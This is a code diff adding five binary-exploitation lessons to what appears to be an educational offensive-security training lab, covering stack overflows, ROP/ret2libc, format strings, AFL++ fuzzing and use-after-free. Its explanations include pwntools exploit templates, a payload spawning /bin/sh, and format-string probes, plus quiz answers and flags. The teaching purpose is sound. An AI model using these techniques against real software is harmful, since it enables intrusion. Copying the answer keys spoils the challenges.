@@ -658,6 +658,236 @@ Anti-forensics techniques (for understanding defender perspective):
   Process hollowing — running malicious code inside the memory space of a legitimate process`
   },
 
+  // ── PHASE 7: BINARY EXPLOITATION ─────────────────────────────────────────
+
+  {
+    id: 'offensive-16',
+    title: 'Phase 7 — Stack Buffer Overflow: Finding the Offset',
+    objective: `Buffer overflows occur when a program writes more data into a fixed-size buffer than it can hold, overwriting adjacent memory — including the saved return address on the stack. When you control the return address, you control execution. The first step is finding the exact offset — the number of bytes needed to reach and overwrite EIP/RIP. The pwntools cyclic() function generates a De Bruijn sequence where every 4-byte window is unique, so any crash EIP value tells you the exact offset. What pwntools function generates a 200-byte De Bruijn cyclic pattern?`,
+    hint: 'Import from pwn and call cyclic with a length argument: cyclic(200)',
+    answers: ['cyclic(200)', 'from pwn import *; cyclic(200)', 'msf-pattern_create -l 200', 'pattern_create 200'],
+    xp: 25,
+    explanation: `Stack buffer overflow exploitation is the foundational binary exploitation skill — understanding it teaches you memory layout, calling conventions, and OS mitigations at the lowest level.
+
+Stack frame layout (function call):
+  HIGH addresses  [ previous stack frames ]
+                  [ saved RIP / EIP       ]  <- overwrite this to redirect execution
+                  [ saved RBP / EBP       ]
+                  [ local variables       ]
+                  [ your buffer is here   ]  <- overflow starts here
+  LOW addresses
+
+Step 1 - Generate cyclic pattern:
+  python3 -c "from pwn import *; sys.stdout.buffer.write(cyclic(200))" > payload
+
+Step 2 - Run vulnerable program with pattern:
+  ./vuln < payload         (or feed via stdin, pipe, file, socket as needed)
+
+Step 3 - Note crash EIP in GDB (pwndbg):
+  run < payload
+  Program crashes: EIP = 0x61616166
+  cyclic_find(0x61616166)  => 72    (offset is 72 bytes)
+
+Step 4 - Verify EIP control:
+  python3 -c "from pwn import *; sys.stdout.buffer.write(b'A'*72 + b'B'*4)" | ./vuln
+  EIP is now 0x42424242 (BBBB) - you own execution
+
+pwntools full workflow:
+  from pwn import *
+  p = process('./vuln')
+  p.sendline(cyclic(200))
+  p.wait()
+  core = p.corefile
+  offset = cyclic_find(core.eip)
+
+Mitigations you will encounter and need to bypass:
+  Stack canary:   random value between buffer and saved return address - overwrite = detected
+  ASLR:           randomises stack, heap, library addresses each run
+  NX/DEP:         stack marked non-executable - shellcode on stack will not run
+  PIE:            binary itself loaded at random address each run`,
+    flag: 'FLAG{eip_control_achieved}'
+  },
+
+  {
+    id: 'offensive-17',
+    title: 'Phase 7 — Return-Oriented Programming (ROP)',
+    objective: `NX/DEP prevents executing shellcode on the stack. Return-Oriented Programming bypasses this by chaining existing code snippets (gadgets) already in the binary or its libraries. Each gadget is a short sequence ending in RET — which pops the next address off the stack. Since you control the stack (via overflow), you chain gadgets like instructions. What tool finds all ROP gadgets available in a binary?`,
+    hint: 'ROPgadget and ropper are the standard tools. ROPgadget --binary ./vuln lists all gadgets.',
+    answers: ['ROPgadget', 'ropper', 'ROPgadget --binary', 'ropper -f binary', 'radare2'],
+    xp: 25,
+    explanation: `ROP (Return-Oriented Programming) is the standard technique for exploiting binaries with NX/DEP enabled. Rather than injecting code, you reuse code that already exists.
+
+Finding gadgets:
+  ROPgadget --binary ./vuln                       All gadgets in binary
+  ROPgadget --binary ./vuln --string "/bin/sh"    Find the /bin/sh string
+  ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --rop   Gadgets in libc
+  ropper -f ./vuln --search "pop rdi; ret"        Search specific gadget pattern
+
+Key gadgets for function calls (x86-64 calling convention):
+  pop rdi ; ret    First argument (RDI)
+  pop rsi ; ret    Second argument (RSI)
+  pop rdx ; ret    Third argument (RDX)
+  ret              Stack alignment (required on modern x86-64)
+
+ret2libc chain - call system("/bin/sh"):
+  payload  = b'A' * offset             # overflow padding
+  payload += p64(pop_rdi_gadget)        # gadget: pop rdi ; ret
+  payload += p64(bin_sh_string_addr)    # RDI = pointer to "/bin/sh"
+  payload += p64(ret_gadget)            # align stack to 16 bytes
+  payload += p64(system_addr)           # call system(RDI)
+
+Defeating ASLR with information leak:
+  ASLR randomises libc base each run
+  Need to leak one libc address at runtime to calculate all offsets
+  Common leak sources: format string bug, out-of-bounds read, GOT entry print
+  Once you have one libc address: base = leaked_addr - libc.symbols['puts']
+  Then: system_addr = base + libc.symbols['system']
+
+pwntools ROP automation:
+  from pwn import *
+  elf = ELF('./vuln')
+  libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+  rop = ROP([elf, libc])
+  rop.system(next(libc.search(b'/bin/sh')))
+  print(rop.dump())`,
+    flag: 'FLAG{rop_chain_built}'
+  },
+
+  {
+    id: 'offensive-18',
+    title: 'Phase 7 — Format String Vulnerabilities',
+    objective: `Format string vulnerabilities occur when user-controlled input is used directly as the format string in printf() — e.g., printf(user_input) instead of printf("%s", user_input). Format specifiers like %x read values off the stack, and critically %n writes the byte count to a pointer on the stack — enabling arbitrary memory writes. This is both a powerful info leak and an arbitrary write primitive. What format specifier reads a value from the stack as a hex integer?`,
+    hint: '%x reads and prints the next value off the stack as a hexadecimal integer.',
+    answers: ['%x', '%p', '%08x', 'percent x'],
+    xp: 20,
+    explanation: `Format string bugs provide two exploitation primitives in one: arbitrary read and arbitrary write.
+
+Detecting the vulnerability:
+  Send: AAAA%x.%x.%x.%x.%x.%x
+  Vulnerable output shows hex values from the stack, including 41414141 (your AAAA)
+  Safe output would print the string literally
+
+Reading stack memory:
+  %x or %p    Read next stack value as hex
+  %s          Treat next stack value as pointer, print string at that address
+  %7$x        Direct parameter: read the 7th stack value (skip to position)
+
+Finding your buffer position:
+  Send: AAAA%1$x.%2$x.%3$x.%4$x.%5$x...%12$x
+  Find which offset shows 41414141 - that is your buffer position N
+
+Arbitrary read with %s:
+  Build: [4-byte target addr]%N$s
+  %N$s will print the string at the address in position N (your buffer)
+  This lets you read any memory address including libc, binary, stack values
+
+Arbitrary write with %n:
+  %n writes the count of printed characters so far to the address pointed to by the next argument
+  Control the character count + control the pointer = write any value to any address
+  Used to: overwrite GOT entries (hijack future function calls), overwrite saved return address
+
+pwntools format string exploit builder:
+  from pwn import *
+  payload = fmtstr_payload(offset, {target_addr: desired_value})
+  Automatically constructs write payload for you
+
+Real-world impact: format string bugs have been found in wu-ftpd, sudo, screen, and dozens of network daemons.`
+  },
+
+  {
+    id: 'offensive-19',
+    title: 'Phase 7 — Coverage-Guided Fuzzing with AFL++',
+    objective: `Fuzzing is automated vulnerability discovery — feed a program malformed inputs and watch for crashes. AFL++ (American Fuzzy Lop++) is coverage-guided: it instruments the binary at compile time, tracks which code branches get hit, and uses genetic algorithms to evolve inputs that explore new paths. New paths = new code = new potential crashes. AFL++ has discovered thousands of CVEs in real software. What compiler wrapper does AFL++ provide to instrument a C binary for fuzzing?`,
+    hint: 'AFL++ wraps clang with its own compiler: afl-cc or afl-clang-fast',
+    answers: ['afl-cc', 'afl-gcc', 'afl-clang-fast', 'AFL_USE_ASAN=1 afl-cc'],
+    xp: 25,
+    explanation: `Fuzzing is how Google, Microsoft, and major security teams find vulnerabilities in production software before attackers do.
+
+AFL++ workflow:
+
+Step 1 - Instrument and compile:
+  afl-cc -o vuln_fuzz vuln.c
+  AFL_USE_ASAN=1 afl-cc -o vuln_asan vuln.c    With AddressSanitizer (finds memory errors)
+
+Step 2 - Create seed corpus:
+  mkdir in_dir out_dir
+  echo "valid input" > in_dir/seed1     Start with inputs the program accepts normally
+
+Step 3 - Run fuzzer:
+  afl-fuzz -i in_dir -o out_dir -- ./vuln_fuzz @@
+  @@ gets replaced with path to generated input file
+  For stdin input: afl-fuzz -i in_dir -o out_dir -- ./vuln_fuzz  (no @@, uses stdin)
+
+Step 4 - Read the dashboard:
+  execs/sec:    Throughput - higher is better (aim for 1000+)
+  total paths:  Unique code paths found - watch this grow
+  crashes:      Bugs found - check out_dir/crashes/ for each one
+  hangs:        Infinite loops or very slow inputs - check out_dir/hangs/
+
+Step 5 - Triage crashes:
+  for f in out_dir/crashes/id*; do
+    echo "Testing: $f"
+    ./vuln_fuzz "$f"
+  done
+  Open each in GDB/pwndbg: run < crash_file
+
+Specialised fuzzing approaches:
+  libFuzzer:        In-process fuzzer, clang -fsanitize=fuzzer, write LLVMFuzzerTestOneInput()
+  Grammar-based:    For JSON, HTTP, XML - knows valid structure, fuzzes values
+  Snapshot fuzzing: Restore snapshot instead of restart - 10-100x faster
+  Network fuzzing:  boofuzz (Python), peach fuzzer for protocol implementations
+
+AFL++ found bugs in: bash, ImageMagick, PHP, Mozilla Firefox, OpenSSL, sqlite3, and thousands more.`,
+    flag: 'FLAG{fuzzer_finds_crashes}'
+  },
+
+  {
+    id: 'offensive-20',
+    title: 'Phase 7 — Heap Exploitation: Use-After-Free',
+    objective: `Heap exploitation targets dynamically allocated memory. A Use-After-Free (UAF) occurs when code frees a memory chunk but retains a pointer and continues to use it. If an attacker can allocate a new object into that freed slot and control its contents, they control what the original code reads — including function pointers, vtable pointers, and security-sensitive values. UAF is the dominant vulnerability class in Chrome, Firefox, and the Linux kernel. What GDB/pwndbg command visualises heap chunks with colour-coded metadata to help understand heap state?`,
+    hint: 'pwndbg provides vis_heap_chunks for a visual coloured view of the heap layout.',
+    answers: ['vis_heap_chunks', 'heap chunks', 'heap', 'bins', 'pwndbg vis_heap_chunks'],
+    xp: 25,
+    explanation: `Heap exploitation is the dominant bug class in modern software. Understanding it is essential for both exploit development and patch analysis.
+
+glibc heap chunk structure (ptmalloc2):
+  malloc(32) returns a chunk laid out as:
+    [prev_size | size+flags | user data (32 bytes) | padding]
+  When freed, the user data area is repurposed for free list pointers:
+    [prev_size | size+flags | fd (fwd pointer) | bk (back pointer) | ...]
+
+Free bins (where freed chunks go):
+  tcache:    Per-thread cache, 7 chunks per size class, fastest path (glibc 2.26+)
+  fastbins:  Small sizes (< 128 bytes), LIFO singly-linked, no coalescing
+  smallbins: Double-linked circular list for medium sizes
+  largebin:  For large allocations, sorted by size
+
+Use-After-Free exploitation chain:
+  1. Object A (size 32) allocated at 0x1000
+  2. Object A freed - chunk goes to tcache[32] bin
+  3. Object B (size 32) allocated - tcache gives back 0x1000 (reuse!)
+  4. Attacker controls B's contents (user input written to B)
+  5. Original pointer to A is used - reads B's attacker-controlled data
+  6. If A had a function pointer, attacker controls code execution
+
+pwndbg heap analysis commands:
+  heap chunks          List all heap chunks with prev_size, size, data preview
+  vis_heap_chunks      Coloured visual display - FREE chunks in red, allocated in blue
+  bins                 Show tcache, fastbins, smallbins, largebin contents
+  malloc_chunk 0x1000  Inspect chunk metadata at specific address
+  heap --all           Show heap across all threads
+
+Chrome V8 exploitation (simplified):
+  V8 uses its own heap (Oilpan/PartitionAlloc)
+  UAF in JS object handling -> type confusion
+  Type confusion -> read/write primitive on heap
+  Read primitive -> leak heap/code address -> defeat ASLR
+  Write primitive -> overwrite JIT code or function table -> RCE
+  Then: sandbox escape via second bug in browser process
+
+Defence: Use-after-free mitigations include heap hardening (GCC -D_FORTIFY_SOURCE),
+MemTagging (ARM MTE), safe unlink checks, ASAN/HWASan in production.`
+  },
 ]
 
 export default function OffensiveLab() {
